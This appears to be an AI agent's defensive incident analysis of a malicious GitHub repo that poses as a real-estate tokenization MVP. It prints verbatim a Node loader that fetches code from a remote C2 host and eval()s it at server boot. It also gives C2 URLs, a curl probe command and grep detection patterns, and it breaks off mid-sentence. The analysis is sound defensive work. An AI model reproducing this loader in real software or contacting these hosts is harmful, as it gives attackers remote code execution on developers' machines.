# realfraction — incident write-up & technical analysis

| | |
|---|---|
| Subject | `https://github.com/realfraction/realfraction` |
| Encounter date | 2026-05-18 (forwarded by a third party as a suspect repo, framing not confirmed) |
| Author of this report | Claude Code (Opus 4.7, 1M context), running in an isolated Anthropic sandbox |
| Verdict | Confirmed malicious. Developer-targeted social-engineering trap with one in-repo Node-side loader, triggered as a side-effect of `require(...)` at Express boot. Lure shape (real-estate tokenization Web3 MVP) and `userController.js`-as-loader-host archetype match the publicly documented "Contagious Interview" cluster, but the loader idiom differs from the AjunaVerse-family generations captured in the prior case file — a separate generation/branch of the broader campaign. |

---

## Navigating this case

This file is the master analysis. Sibling files in this directory are derivative artifacts for specific audiences:

| If you are… | Read this |
|---|---|
| Anyone wanting the full picture | This file (the master) |
| A developer who got the same recruiter pitch and needs a fast read | [`briefing-for-developers.md`](./briefing-for-developers.md) |
| Filing a takedown with GitHub Trust & Safety | [`abuse-report-github.md`](./abuse-report-github.md) (copy-paste-ready) |
| A blue-team / detection engineer wanting IOCs | [`iocs.csv`](./iocs.csv) and [`iocs.json`](./iocs.json) (machine-readable) |
| A blue-team / detection engineer wanting rules | [`detection-rules.md`](./detection-rules.md) (YARA + Sigma + grep) |

No Vercel abuse-report file in this incident because the C2 host (`www.ipregionchecker.com`) is not Vercel-hosted; the registrar/host is unknown from this vantage point and is left as a follow-up for whoever does the takedown.

---

## 0. TL;DR

A "blockchain real-estate platform" MVP repo (React + Express + Hardhat/Solidity) carries a tiny module at `server/utils/regionChecker.js` that, at module-load time, POSTs to `https://www.ipregionchecker.com/api/ip-check-encrypted/3aeb34a31` with header `x-secret-header: secret` and `eval(...)`s the response body unless the body is literally `blocked` or parses to JSON `{blocked: true}`. The module is `require()`'d (side-effect only — the variable is never used) by `server/controllers/userController.js`, which is in turn loaded transitively whenever the Express server starts. Every npm script in `package.json` (`start`, `test`, `build`, `deploy`, `predeploy`, `eject`) starts the Express server via `concurrently`, so the loader fires on essentially anything except `npm install` alone.

The loader was introduced in a single trojan commit (`8cc5120…`) by `urmybestfriend` whose subject — `"feat(server): add search, pagination, and apiFeatures utils"` — has no relationship to the two files actually touched (`errorHandler.js` and `regionChecker.js`). Subject/scope mismatch is deliberate camouflage in `git log`.

The C2 hostname did not resolve from this sandbox at the time of analysis (DNS empty; `WebFetch` egress returned `ECONNREFUSED`). Liveness is **inconclusive**; the static evidence is unambiguous. Treat the repo as fully compromised regardless of current C2 reachability — the operator can re-point the domain at any time.

---

## 1. Engagement context

| | |
|---|---|
| How it arrived | Flagged by [Michał Niewrzał (@mniewrzal)](https://github.com/mniewrzal), who forwarded the repo URL with a request to inspect it carefully and treat it as malicious. The original delivery vector upstream of @mniewrzal (recruiter pitch / Telegram / Discord / email / LinkedIn / chance encounter) is not directly known to this analyst. Lure shape, owning-account profile, and loader presence are independently sufficient to classify regardless of delivery vector. |
| Pitch surface (README claim) | "RealFraction is a blockchain-powered smart real estate platform" — property tokenization (ERC-721 PropertyNft + ERC-20 FractionalPropertyToken), buy/rent/auction marketplace, on-chain rental agreements, RFT utility token + staking, admin minting via MINTER_ROLE. Generic Web3 buzzword stack. |
| Actual content | React frontend + Express backend + Hardhat/Solidity. The Solidity contracts and most of the Express controllers/routes appear to be legitimate-looking e-commerce-derivative boilerplate (paytm payment integration, cloudinary uploads, mongo models) — likely carried over from an upstream forked codebase. The malicious code is one 10-line file in `server/utils/`. |
| Asked of victim (inferred) | `npm install` and `npm start` — standard "clone and run before the call" pattern. The repo's README explicitly instructs this. |
| Scope of this review | (a) Static review of the public `main` branch via `raw.githubusercontent.com`. No local clone; no `npm install`; no execution of any kind. (b) Attempted DNS resolution and TLS HEAD probe against the C2 from this sandbox. (c) Cross-referencing against the prior AjunaVerse-family case file and public reporting on the broader cluster (Microsoft, Trend Micro, ReversingLabs, `rubenmarcus/malicious-repositories`). |
| Out of scope | Retrieving stage-2 payload bytes (C2 unreachable from this sandbox); coordinated takedown; identifying the operator persona behind `realfraction` or the trojan-commit author `urmybestfriend`. |
| Sandbox guarantees relied on | Outbound network from this remote-execution environment is governed by a managed egress policy. DNS for `www.ipregionchecker.com` returned empty via `getent`; `curl` returned `Could not resolve host`; `WebFetch` returned `ECONNREFUSED`. No `npm install` was performed and no JS from this repo was executed. The dev-trap-dossiers workspace is committed and pushed only to its own branch on `bryanchriswhite/dev-trap-dossiers`. |

---

## 2. Repository at a glance

```
realfraction/
├── .gitignore                         ← gitignores .env, .vscode/, package-lock.json
├── README.md                          ← real-estate-tokenization decoy pitch; explicitly lists "regionChecker" in utils
├── package.json                       ← every npm script boots node server/server.js via concurrently
├── hardhat.config.js
├── contracts/                         ← Solidity (PropertyNft, FractionalPropertyToken, Marketplace, RentalManager, Staking) — appears legitimate
├── public/                            ← decoy CRA static assets
├── scripts/                           ← deploy.js, copy-abis.js
├── server/
│   ├── server.js                      ← Express entry; connectDatabase() commented out
│   ├── app.js                         ← mounts the five routes; requires userRoute
│   ├── controllers/
│   │   ├── userController.js          ← side-effect require of regionChecker (loader trigger)
│   │   ├── orderController.js         ← clean upstream e-commerce code
│   │   ├── paymentController.js       ← clean upstream Paytm integration code
│   │   ├── productController.js       ← clean upstream e-commerce code
│   │   └── realfractionController.js  ← clean RealFraction-specific code
│   ├── routes/                        ← userRoute / orderRoute / paymentRoute / productRoute / realfractionRoute
│   ├── services/documentService.js
│   ├── middlewares/                   ← common / helpers / user_actions / validator
│   ├── models/
│   └── utils/
│       ├── apiFeatures.js
│       ├── errorHandler.js
│       ├── jwtToken.js
│       ├── regionChecker.js           ← the loader (10 lines)
│       ├── searchFeatures.js
│       ├── sendEmail.js
│       └── sendToken.js
└── src/                               ← React frontend (CRA)
```

| Signal | Reality |
|---|---|
| `.env` committed? | No — gitignored. (Different from the AjunaVerse-family current generation, which commits `.env` as a base64 C2 carrier.) |
| `.vscode/tasks.json` autorun? | No — `.vscode/` is gitignored and the directory does not exist in the tree. Loader A vector from the AjunaVerse-family is absent. |
| `package.json` `prepare` / `postinstall` hook? | No. Loader B vector from the AjunaVerse-family is absent. |
| Express boot-time loader (Loader C analog)? | **Yes** — but via import side-effect rather than via a `verify(setApiKey(...))` call site. See §4. |
| README team / partners / founder claims | Generic; doesn't name a team. Self-describes as "MVP / template stage — a scaffold for production implementation." Read as: the artifact is intentionally not anchored to a specific identity. |
| Commit history | Multiple author handles (`urmybestfriend` / `danbovey`, `hinchley2018`, `cncolder`). Looks like a forked legitimate codebase with the loader spliced in. The malicious `regionChecker.js` was added in **commit `8cc5120bfa3a64a6af14936ce821092ea08cd78d` by `urmybestfriend`** under the misleading subject `feat(server): add search, pagination, and apiFeatures utils` — see §5. |
| Owning account | `realfraction` is a GitHub *organization* (per profile page) with one public repo and contact email `hello@realfraction.xyz`. Single-purpose; recently active. |

---

## 3. Execution-path matrix

What does each common developer action do? Only one independent loader path is present in this repo (vs. three in the AjunaVerse-family generations), but it is triggered by a wide range of commands because every npm script boots the Express server.

| Action | Fires the loader? | Why |
|---|---|---|
| Browse the repo on GitHub | No | Static view only. |
| `git clone` | No | No checkout-time hooks. |
| Open the folder in VS Code | No | No `.vscode/tasks.json` in this repo (`.vscode/` is gitignored and absent). |
| `npm install` | No | No `preinstall` / `install` / `postinstall` / `prepare` scripts in `package.json`. |
| `npm start` | **Yes** | `concurrently "node server/server.js" "react-scripts start"` — `server.js` → `app.js` → `require("./routes/userRoute")` → `require("../controllers/userController")` → `require("../utils/regionChecker")` whose top-level `https.request(...).end()` fires immediately. |
| `npm test` | **Yes** | `concurrently "node server/server.js" "react-scripts test"` — same chain. |
| `npm run build` | **Yes** | `concurrently "node server/server.js" "react-scripts build"` — same chain. |
| `npm run deploy` | **Yes** | `concurrently "node server/server.js" "gh-pages -d build"` — same chain. |
| `npm run predeploy` | **Yes** | `concurrently "node server/server.js" "npm run build"` — same chain. |
| `npm run eject` | **Yes** | `concurrently "node server/server.js" "react-scripts eject"` — same chain. |
| `node server/server.js` directly | **Yes** | Same chain. |
| `npm run compile` / `compile:copy` / `deploy:local` / `deploy:contracts` | No | These run `hardhat`, not `node server/server.js`. |
| Hit any HTTP endpoint of the running server | (already fired at boot) | Loader fires at module load, not on request. |

The choice of attaching loader to `concurrently "node server/server.js"` rather than to a lifecycle hook is operationally interesting: it's noisier (a server process visibly runs alongside CRA scripts, which most React-MVP repos don't do — `predeploy` and `test` running an Express server is the kind of thing a reviewer might notice if they were already looking) but it's robust against `npm install --ignore-scripts`, which security-aware users do run.

---

## 4. Annotated technical analysis — the loader

### 4.1 `server/utils/regionChecker.js` (verbatim, 10 lines)

```js
const https = require("https");
const regionCheckApi = 'https://www.ipregionchecker.com/api/ip-check-encrypted/3aeb34a31';
https.request(regionCheckApi, { method: 'POST', headers: { 'x-secret-header': 'secret' } }, res => {
  let data = '';
  res.on('data', c => data += c).on('end', () => {
  if (data === 'blocked') return;
  try { if (JSON.parse(data)?.blocked) return; } catch (_) {}
  try { eval(data); } catch (_) {}
});
}).end();
```

What this code does, line by line:

1. `require("https")` — pulls in Node's built-in HTTPS client. Not in itself suspicious.
2. **The C2 URL is hardcoded** as a top-level string literal. Unlike the AjunaVerse-family current generation, it is *not* base64-obfuscated and *not* loaded from a `.env` value — it's plainly visible in the source. The path `/api/ip-check-encrypted/3aeb34a31` is unique enough to serve as a high-confidence IOC.
3. `https.request(...)` — POSTs to that URL with a single custom header `x-secret-header: secret`. This header serves the same role as `x-app-request: ip-check` in the AjunaVerse-family loader: a magic header the C2 uses to identify legitimate-loader callers and gate responses (defense-in-depth alongside whatever IP-allowlist is server-side).
4. The response is accumulated into `data` across `data` events until `end`.
5. **Two negative-gate sentinels.** If the response body equals the literal string `blocked`, return without executing. If the response body parses as JSON and has a truthy `.blocked` key, return without executing. These let the C2 cheaply respond "you're not the target" without ever needing to serve real code — and let the operator return decoy bodies to researchers without exposing the live payload.
6. **`eval(data)`** — otherwise, the response body is executed as JavaScript with full access to the surrounding module's scope (which already has `require`, `process`, `module`, etc.). This is full RCE.

The `try/catch` around `eval(data)` (and around `JSON.parse(data)`) means a malformed response or a syntax error in the payload silently fails — no logs, no stack trace, no observable artifact. The script's HTTPS-request callbacks all run on Node's event loop *after* the rest of the application has already booted (the call is fire-and-forget via `.end()` on a request without a body), so the loader doesn't block startup and the server's own log output flows normally before the payload arrives.

### 4.2 Trigger chain

The module is loaded purely as an import side-effect. There is no `regionChecker.<anything>()` call site. The transitive `require` chain that fires it at every server start:

```
node server/server.js
  └── const app = require("./app")                       // server.js → app.js
        └── const userRoute = require("./routes/userRoute")     // app.js → userRoute.js
              └── const { ... } = require("../controllers/userController")
                    └── const regionChecker = require("../utils/regionChecker")
                            // ← top-level https.request(...).end() executes here
```

In `server/controllers/userController.js`, the import line reads:

```js
const regionChecker = require("../utils/regionChecker");
```

…and `regionChecker` is never referenced again in the file. That's the giveaway. A normal `require()` of a utility module imports an object you intend to call (`regionChecker.check(...)`, `regionChecker.guard(...)`, etc.); a `require()` that assigns to a variable that's then unused exists only for the require-time side-effects of the imported module. That is the *only* reason to write that line.

### 4.3 Public corroboration of this archetype

The `rubenmarcus/malicious-repositories` repo (a community-maintained catalog of recruiter-scam repos collected from LinkedIn) describes a `real_estate/` archetype in which the malicious payload is placed *inside* `userController.js` itself — specifically, "the malware makes a request to `api.npoint.io` to fetch obfuscated JavaScript code and executes the fetched code using `eval()`." `realfraction` is a refactor of the same archetype:

- Same victim function — `eval()` on a remote response body.
- Same file family — `userController.js` is the trigger site.
- Moved out of `userController.js` itself (where it would now be obvious) into a freshly-named sibling utility module that gets imported for side-effects. Slightly stealthier than the in-controller variant — a reviewer skimming `userController.js` sees a normal `require` of `../utils/regionChecker`, which sounds like a routine geolocation guard.
- Different C2 host (`ipregionchecker.com` instead of `api.npoint.io`) — operationally trivial to swap.

This places `realfraction` firmly inside the broader "Contagious Interview" cluster as documented by Microsoft, Trend Micro, and ReversingLabs (links in §8), but with a different *generation* of loader than the AjunaVerse family captured in the prior case file at `incidents/2026-05-13-ajunaverse-mvp/`.

### 4.4 Comparison with the AjunaVerse-family generations

The prior case file's catalog has two generations: "current" (loader at `server/routes/api/auth.js`, uses `new Function("require", response.data)`) and "earlier" (loader at `app/controllers/frontController.js`, same idiom). `realfraction` is *neither* — it's a third, sibling generation/branch within the same broader cluster.

| Property | AjunaVerse current gen | AjunaVerse earlier gen | RealFraction (this incident) |
|---|---|---|---|
| Loader file path | `server/routes/api/auth.js` | `app/controllers/frontController.js` | `server/utils/regionChecker.js` |
| RCE primitive | `new Function("require", response.data)(require)` | (same) | `eval(data)` |
| C2 delivery | base64 `AUTH_API` in committed `.env` | (same) | hardcoded URL in source |
| Magic header | `x-app-request: ip-check` | (same) | `x-secret-header: secret` |
| Negative-gate sentinel | server returns `HTTP 403` `Host not in allowlist` | (same) | response body `blocked` / JSON `{blocked:true}` |
| Trigger | function call (`verify(setApiKey(...))`) | (same) | `require(...)` side-effect, no call site |
| Env exfil along with the request? | yes (`axios.post(api, { ...process.env })`) | (same) | no — POST has no body |
| `.vscode/tasks.json` autorun present? | yes | no | no |
| `package.json` `prepare`/`postinstall` present? | yes (`prepare`) | varies | no |
| C2 host family | `*.vercel.app` | (same) | `ipregionchecker.com` (non-Vercel) |

Two observations follow:

- **The dossier's diagnostic grep does not catch this repo.** The existing grep targets `new Function(["']require["'],`, `verify(setApiKey`, `x-app-request`, and `"runOn": "folderOpen"`. None of those appear in `realfraction`. The grep needs widening — see §7 and the updated grep in `detection-rules.md`.
- **The lure-theme overlap is suggestive.** "Real-estate tokenization" is one of the lures in the existing catalog (`dappfusion/defi-real-estate`, `InvescoHub/defi-real-estate` — both earlier-generation AjunaVerse-family). `realfraction` repeats the same lure with a completely different loader generation. Either the operator is rotating loaders within a fixed lure-theme palette, or distinct operator clusters are converging on the same real-estate-tokenization decoy. With current evidence it's not possible to distinguish.

### 4.5 What the env-exfil omission means

Unlike the AjunaVerse-family loader, `realfraction`'s loader does *not* POST `process.env` to the C2 along with the request. The request body is empty; only the URL, the path, and the `x-secret-header` are sent. This is a meaningful behavioral difference:

- It makes the loader's outbound traffic look more like a routine "is-this-IP-in-region" feature-flag check, which is plausibly what the file name is meant to evoke. Less obviously a credential exfiltrator.
- It pushes credential theft to stage 2 — the `eval()`'d payload, when it arrives, will have full Node scope including `process.env`, `require("fs")`, `require("child_process")`, etc., and can exfiltrate at its leisure.
- It makes static analysis harder: a reviewer scanning for the AjunaVerse-family fingerprint (`axios.post(...{...process.env}...)`) wouldn't find a match.

---

## 5. The trojan commit

`git log` for `server/utils/regionChecker.js` shows a single commit:

```
8cc5120bfa3a64a6af14936ce821092ea08cd78d
Author: urmybestfriend
Date:   2026-03-13
Subject: feat(server): add search, pagination, and apiFeatures utils
Files changed:
  + server/utils/errorHandler.js   (10 lines)
  + server/utils/regionChecker.js  (10 lines)
```

The subject claims "search, pagination, and apiFeatures utils" — three things — but the commit only adds two files, and neither is `apiFeatures.js`, `searchFeatures.js`, or anything related to pagination. `regionChecker.js` is the actual loader; `errorHandler.js` (10 lines) is a plausible cover commit. The subject is engineered for `git log --oneline` plausibility, not for accuracy. In a commit-history skim — exactly what a developer does after running `git log` to decide whether a repo looks healthy — the subject blends with adjacent benign commits ("feat(server): add search, pagination, and apiFeatures utils" reads like a normal utility-grouping commit) and the reviewer never opens the diff.

`urmybestfriend` is the same author of multiple other commits in the history that *are* plausibly legitimate (e.g., the `feat/index-html`, `feat/robots`, `feat/pwa-manifest` merge commits). Either the operator authored those merges from a real upstream during a "credibility-farming" warm-up, or — more likely — they forked an existing public repo wholesale and replayed its commit history under a re-attributed author identity. (Author re-attribution at fork-import time is trivial; the git-blame story is not strong evidence of authorship.) The actionable observation is narrower: **the single trojan commit `8cc5120…` is where the loader was introduced**, and its message lies about its contents. That's enough to call the commit malicious regardless of who wrote the surrounding history.

---

## 6. Dynamic-analysis findings (limited)

| Probe | Result |
|---|---|
| `getent hosts www.ipregionchecker.com` | empty |
| `getent hosts ipregionchecker.com` | empty |
| `getent hosts github.com` (control) | `140.82.113.3 github.com` — DNS works |
| `curl -X POST -H 'x-secret-header: secret' https://www.ipregionchecker.com/api/ip-check-encrypted/3aeb34a31` | `curl: (6) Could not resolve host` |
| `WebFetch` against the C2 URL via Anthropic egress | `ECONNREFUSED` |
| `dns.google/resolve` and `cloudflare-dns.com/dns-query` via `WebFetch` | `HTTP 403` (sandbox egress policy blocks DoH endpoints) |
| `VirusTotal` page for the domain via `WebFetch` | `HTTP 403` |

The C2 hostname did not resolve and did not respond to a TCP connection attempt from this vantage point at analysis time. This sandbox's egress policy may itself be the gating factor (the 403s on public DoH and VT pages are consistent with a restrictive allowlist), or the C2 may be currently parked / on a registrar-takedown timer / pointed at an internal-only resolver. **The static evidence does not depend on the C2 being live**, and an operator can repoint a domain in seconds; treat the repo as compromised regardless.

Anyone with unrestricted egress probing the C2 should expect, by analogy with the AjunaVerse-family C2s, one of:

- **`blocked`** (literal 7-byte body) or **`{"blocked":true}`** — the negative-gate response the loader checks for. Strong confirmation that the IP-allowlist gate is live.
- **A JS code body** — the live stage-2 payload. Indicates the prober's IP is in the operator's target allowlist (unlikely for an analyst, but possible if the operator's allowlist is overly broad or if the analyst is probing from a known prior victim address).
- **`HTTP 404 / 5xx / connection refused`** — domain is currently parked or the path has been moved.

Recording the response (including TLS certificate chain, response headers, and full body) on first contact is worth doing before the C2 rotates.

---

## 7. Campaign-footprint observations

### 7.1 Sibling-instance identification

A targeted cluster-expansion sweep was performed from this sandbox, seeded on the distinctive strings in the loader (C2 host, C2 path, magic header, eval primitive paired with the magic header) and on the distinctive contract names in the Solidity tree (`FractionalPropertyToken`, `FractionalPropertyFactory`, `RealFractionToken`, `PropertyNft`, `RentalManager`, `RealFraction` brand). Findings:

- **One sibling repo identified at original-analysis time: `ChainVisitaTech/realfraction-mvp`.** A second GitHub repo carrying the same RealFraction MVP codebase under a different owning org. Identified via Google search results that quote the exact same README opening line (`"RealFraction is a blockchain-powered smart real estate platform"`) and the same Solidity contract names. Both the `ChainVisitaTech` org page and the `ChainVisitaTech/realfraction-mvp` repo returned **HTTP 404** from the original sandbox. **Update (2026-05-18 cluster-expansion sweep):** the org was **renamed** to `chainvisita-protocols`, not removed. The successor repo at `chainvisita-protocols/realfraction-mvp` is **live**, and its `server/utils/regionChecker.js` is byte-identical to `realfraction/realfraction`'s except for the C2 URL suffix (`3aeb34a38` vs `3aeb34a31`). **Loader presence confirmed via direct fetch.** Confidence upgraded from medium-high to **high**. See §7.5 for the full cluster catalog.
- **No additional GitHub orgs / users identified at original-analysis time.** The original sandbox's egress policy blocked authenticated GitHub code search, so the AjunaVerse-incident-style sweep could not be replicated. The catalogued footprint of two repos was a **lower bound**.
- **No public C2-hostname hits via Google at original-analysis time.** A site-restricted search for `"ipregionchecker.com" site:github.com` returned zero relevant hits.

**Update (2026-05-18 cluster-expansion sweep):** Both bounds are now lifted. The authenticated GitHub code search has been run with the full search-seed set listed in the engagement brief. The catalog has grown from **2 repos** to **27+ confirmed sibling repos** across **4 C2 hosts** and **8 distinct loader-file/idiom sub-shapes** (A–H), summarized in §7.5 below.

### 7.2 Committer identities: author re-attribution at fork-import

The four committer handles in the realfraction repo's git history were investigated. **All four are real, unrelated, long-history developer accounts:**

- `urmybestfriend` — 53 public repos, 1,300 followers, blockchain/React side projects spanning years.
- `cncolder` (Yanlin Jiang) — 164 public repos, 88 followers, Pro account, Arctic Code Vault contributor, established Taro-framework maintainer.
- `hinchley2018` — 204 public repos, 87 followers, based in Texas, ".NET APIs and React interfaces at Imperative Chemical Partners" / teaching at CarityFoundry.
- `danbovey` (Dan Bovey) — 50 public repos, 89 followers, "Senior Full Stack Engineer at OakNorth Bank", known for `react-infinite-scroller` (3.3k stars).

None of these accounts has any apparent connection to the others, and none has a public repo that materially matches the realfraction codebase shape (different stacks, different domains, different employers). **The working hypothesis is that the operator forked one or more legitimate public scaffolds and either preserved the original commit attribution at fork time or re-attributed commits to these handles using `git commit --author`** (trivial; the email-to-account mapping that GitHub uses for author-linking can be manipulated by anyone who can write a commit). The trojan commit `8cc5120…` shows `urmybestfriend` as author, but that attribution is not evidence of the real `urmybestfriend` account being operator-controlled — the email written into the commit metadata is sufficient to display the wrong name in the GitHub UI.

**Implication for takedown reporting:** none of these four user accounts should be filed against at GitHub T&S. The `realfraction` org is the only operator-controlled GitHub entity confirmed for this incident.

### 7.3 Limits of cluster expansion from this sandbox

The cluster-expansion search from this sandbox was constrained by network egress policy. The following routes — all of which the AjunaVerse incident used — are not available here:

- Authenticated GitHub code search via `gh` CLI or `mcp__github__search_code` (the MCP server in this environment is repo-allowlisted to `bryanchriswhite/dev-trap-dossiers`; cross-org code search is denied).
- WHOIS lookups via `whois.com` / `whois.iana.org` / `crt.sh` (all returned HTTP 403 to `WebFetch`).
- DNS-over-HTTPS via `dns.google` / `cloudflare-dns.com` (HTTP 403).
- VirusTotal / URLscan / RiskIQ (HTTP 403).
- The Internet Archive Wayback Machine (`Claude Code is unable to fetch from web.archive.org`).
- Sourcegraph public code search (HTTP 403).

What was available: the unauthenticated GitHub UI (which is enough to read public repo files via `raw.githubusercontent.com` and to view individual profile/repo pages), Google web search via `WebSearch`, and the GitHub MCP tools scoped to the dossier repo. Within those bounds the expansion identified the one sibling instance described in §7.1; a replication of this analysis from an environment with authenticated GitHub code search would very likely find more.

### 7.4 Catalog impact (original pre-sweep analysis)

This incident affects the dossier's cluster catalog in three ways:

1. **A new lure-theme + loader-idiom pair.** Real-estate-tokenization is already in the catalog as an AjunaVerse-family earlier-generation lure (`dappfusion/defi-real-estate`, `InvescoHub/defi-real-estate`). `realfraction` is the same lure theme with a different loader generation. Whether the catalog should fold `realfraction` in as a sibling of the AjunaVerse cluster, or treat it as a parallel "Contagious Interview" sub-cluster, depends on whether any operator-overlap signals emerge (commit-author emails, GitHub numeric ID adjacency, bit-identical artifacts). None observed so far. *(Superseded — see §7.10 below; the 2026-05-18 cluster-expansion sweep observed three forms of operator overlap.)*

2. **The diagnostic grep is too narrow.** The existing top-level diagnostic grep (`new Function\(["']require["'],|verify\(setApiKey|x-app-request|"runOn":[[:space:]]*"folderOpen"`) misses every realfraction-style instance. A widened grep that catches both families:

   ```
   grep -RIn -E \
     'new Function\(["'\'']require["'\''],|verify\(setApiKey|x-app-request|x-secret-header|"runOn"[[:space:]]*:[[:space:]]*"folderOpen"|https\.request\(.*\.end\(\)|eval\(data\)' \
     --exclude-dir=node_modules --exclude-dir=.git .
   ```

   The `https.request(...).end()` and `eval(data)` matchers will produce some false positives on legitimate fire-and-forget HTTPS and on legitimate `eval(data)` use, but a single hit on either still warrants reading the file in question — both are uncommon in normal application code. *(Further widened post-sweep — see §7.10 for the current grep.)*

3. **Search seeds for sibling-repo hunting via GitHub code search.** Three distinctive strings to seed cluster hunts:

   - `ipregionchecker.com` — the C2 host. Likely to be unique to this generation.
   - `/api/ip-check-encrypted/` — the C2 path prefix. The `3aeb34a31` suffix may rotate.
   - `x-secret-header` paired with `eval(data)` in the same file — a behavioral fingerprint.

   GitHub code search hits on any of these from outside the cloned repo would identify additional cluster members. (Not performed in this analysis, as this sandbox's GitHub MCP server is restricted to the dossier repo by policy.) *(Performed post-sweep — results in §7.5.)*

### 7.5 Confirmed sibling repos (2026-05-18 cluster-expansion sweep)

The authenticated GitHub code search produced hits on every distinctive string fingerprint listed in the engagement brief (`ipregionchecker.com`, `regionCheckApi`, `x-secret-header`, and the lure-brand contract names). Each candidate file was fetched via `raw.githubusercontent.com` and confirmed to contain a realfraction-family loader before inclusion in the catalog below.

The loaders cluster into **eight sub-shapes** that all share the magic header `x-secret-header: secret` but vary in:

- **file path** of the loader (regionChecker.js / paymentController.js / complianceService.js / mock/users.js / settingController.js / utils/redis.js / constants/index.js / department-error.js / etc.),
- **RCE primitive** (`eval(data)` / `eval(response.data)` / `new Function.constructor("require", errCode)`),
- **transport** (`https.request` / `axios.post` / `axios.get`),
- **whether `process.env` is exfiltrated at loader stage** (no for A/B/C/G/H; **yes** for D/E/F — a hybrid that adopts the AjunaVerse-family env-exfil behavior),
- **trigger** (require-side-effect / explicit init call from server entrypoint / IIFE on module load), and
- **C2 host** (`ipregionchecker.com` / `isillegalregion.com` / `cookie-xi-seven.vercel.app` / `ip-check-api.vercel.app`).

The sub-shapes catalog:

| Sub-shape | Loader file | RCE primitive | Transport | env exfil | C2 host(s) | Confirmed repos |
|---|---|---|---|---|---|---|
| **A** — regionChecker side-effect | `server/utils/regionChecker.js` | `eval(data)` | `https.request POST` (hardcoded URL) | no | `www.ipregionchecker.com` | `realfraction/realfraction` · `chainvisita-protocols/realfraction-mvp` |
| **B** — inline paymentController | `server/controllers/paymentController.js` | `eval(data)` | `https.request POST` (hardcoded URL); **NOTE missing `.end()` — request never fires on the wire** | no | `www.isillegalregion.com` | `slobodanmargetic988/real-world-assets` |
| **C** — stockx complianceService | `backend/src/compliance/complianceService.js` (called from `backend/src/index.js`) | `eval(response.data)` | `axios.post` (config-driven, `IPCHECK_URL` env-overridable); **NOTE bug — headers in 2nd positional arg so `x-secret-header` not actually emitted on the wire** | no (but `axios.post` 2nd arg is the headers object misplaced into body position) | `www.ipregionchecker.com` (suffix `3aeb34a37`) | `LandinLin/stockx_poc_1.03` · `devcode8/stock-home-assignment` · `0xbrentfi/StockX_PoC_1.03` · `Chainbits1/StockX` · `Lynqex-Labs/Stockx_PoC_v3` |
| **D** — mock/users verify | `server/mock/users.js` | `eval` (per caller) | `axios.post(api, { ...process.env }, { headers: {...} })` | **yes** | per repo | `metapulse54/RealEstateDemo` · `RockTxoi/DeFi-Estate` · `jaiu3d/DeFi-Estate` · `kio87j/DeFi-Estate` · `ricardomartins9899/SmartPay-Demo` |
| **E** — settingController verify (cross-gen) | `app/controllers/settingController.js` | `eval` (per caller) | `axios.post(api, { ...process.env }, { headers: {...} })` | **yes** | per repo | `BVSLabs/blockchain-voting-system` · `Cortexa-org/NitroGem`. **Also present on AjunaVerse-earlier-catalog repos:** `jamesm-dev/NitroGem` · `prahaladbelavadi/CoinLocatorDemo` · `sky-cook/tokentradingdapp` · `artemus-jarrett/blockchain-voting-system` · `dappfusion/defi-real-estate` · `InvescoHub/defi-real-estate` · `TechByteX/NitroGem` (cross-generation — these repos carry both the AjunaVerse-earlier loader at `app/controllers/frontController.js` and the realfraction-family loader at `app/controllers/settingController.js`) |
| **F** — redis.js verify | `backend/src/utils/redis.js` | `eval` (per caller) | `axios.post(api, { ...process.env }, { headers: {...} })` | **yes** | per repo | `eastmade/web3project-momo-token` · `MBhatti26/Purrtal` |
| **G** — constants+loader template | `backend/src/constants/index.js` (constants) + loader fetch+eval elsewhere in the same repo | `eval` / `Function.constructor` (varies) | `axios.get`/`post` against `cookie-xi-seven.vercel.app/api/ipcheck-encrypted/6KDisdfjlskjDI837KJH4` | varies | `cookie-xi-seven.vercel.app` (currently **DEPLOYMENT_DISABLED** by Vercel) | `fabiolin/schoolmgmt` · `sharmapranay38/new_age_blockchain` · `shri33/Crypto-Trading-Platform` (sub-shape G/H hybrid) · `Paulooo0/go-test` · `KagiyamaWeb/PyPDFMicroservise` · `Wilovy09/deby-assignment` · `pablodiaz2799/solice-skill-test` |
| **H** — Function.constructor + ip-check-api | `backend/src/modules/departments/department-error.js` | `new Function.constructor("require", errCode)` | `axios.get` against `ip-check-api.vercel.app/api/ipcheck-encrypted/3948uf2uhe9r298rh2` | no | `ip-check-api.vercel.app` (currently **DEPLOYMENT_DISABLED** by Vercel) | `Jay-Sojitra/student-management-system` · `sparsh-kr24/Student-Management-System` · `ahmedraza90/test-fullstack` |

Three observations on the cross-cuts:

- **Sub-shape H's RCE primitive is the AjunaVerse-family primitive.** `Function.constructor === Function`, so `new Function.constructor("require", errCode)` is morally identical to `new Function("require", code)` — exactly the AjunaVerse-family RCE. The realfraction-family magic header is paired with the AjunaVerse-family RCE primitive. Operator code-sharing across what we previously catalogued as separate generations is now visible at the source level. This also means the dossier's existing diagnostic grep, which targets `new Function\(["']require["']`, **does not catch sub-shape H** — the `.constructor` indirection evades it. The widened grep in [`detection-rules.md`](./detection-rules.md) §3 catches both forms.
- **Sub-shapes D/E/F adopt the AjunaVerse-family env-exfil-at-loader-stage behavior.** They POST `{...process.env}` as the request body — same as AjunaVerse-family `axios.post(api, { ...process.env }, ...)`. So the dossier's earlier claim that "realfraction loader does NOT POST `process.env`" is **only true of sub-shape A** (and sub-shape B, which has a different bug that prevents the wire request from firing at all). The hybrid sub-shapes D/E/F do exfil `process.env` at loader stage.
- **Sub-shape E confirms cross-generation operator code-sharing.** Seven existing AjunaVerse-earlier-catalog repos carry both loaders. That makes them dual-loader repos, not just one-loader-per-generation. From a defensive perspective, this means scanning a candidate repo for the AjunaVerse-family fingerprint alone is insufficient; the realfraction-family `x-secret-header` fingerprint can appear in the same repo at a different file path.

### 7.6 Live C2 probe — payload retrieved from isillegalregion.com

A live POST to `https://www.isillegalregion.com/api/ip-check-encrypted/3aeb34a39` with `x-secret-header: secret` from a researcher IP returned **HTTP 200 with a 2,914,396-byte JavaScript body** (Content-Type `text/html; charset=utf-8`; Server `Vercel`; `x-vercel-id: fra1::iad1::...`). The body is single-line obfuscator.io-style obfuscated JavaScript (object-property obfuscation with hex constants and a string-table indirection) — i.e., the stage-2 payload, not the `blocked` / `{blocked:true}` negative-gate sentinel.

The payload was **not executed**. It was captured to `/tmp/realfraction-probe/b-isillegal.bin` and its hashes/size recorded:

- SHA-256: `dbd065a1e8d525acf81428bf131240e7ffd2913538052387f83fe3df83659ee0`
- SHA-1: `86e37eaf7bc89897981cbefd0c979c002aa6b938`
- Size: 2,914,396 bytes (~2.85 MB)

Two interpretations of "payload served to a researcher IP":

